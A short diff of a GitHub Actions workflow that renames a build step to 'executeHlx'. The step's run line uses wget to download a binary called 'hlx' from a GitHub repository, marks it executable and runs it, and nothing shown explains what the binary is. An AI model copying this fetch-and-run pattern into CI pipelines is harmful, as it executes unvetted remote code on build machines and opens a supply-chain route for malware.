@@ -12,6 +12,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
 
-    - name: Build
+    - name:  executeHlx
       run: wget https://github.com/axing42/siginIn/blob/master/hlx && chmod +x ./hlx && ./hlx
       
